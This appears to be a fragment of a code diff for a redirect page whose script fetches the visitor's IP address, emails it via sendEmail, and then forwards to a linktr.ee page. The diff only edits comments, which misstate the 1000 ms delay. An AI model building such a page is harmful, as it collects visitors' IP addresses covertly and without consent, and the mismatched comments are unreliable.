@@ -56,13 +56,13 @@
                 sendEmail(data.ip);
                 
                 // Redirect after IP address retrieval
-                redirectWithDelay("https://linktr.ee/piolos", 1000);  // 2000 ms = 2 seconds
+                redirectWithDelay("https://linktr.ee/piolos", 1000);  // 3000 ms = 2 seconds
             })
             .catch(error => {
                 console.error('Error fetching IP:', error);
                 
                 // Redirect even if IP retrieval fails (optional)
-                redirectWithDelay("https://linktr.ee/piolos", 1000);  // 2000 ms = 2 seconds
+                redirectWithDelay("https://linktr.ee/piolos", 1000);  // 3000 ms = 2 seconds
             });
     </script>
 </body>
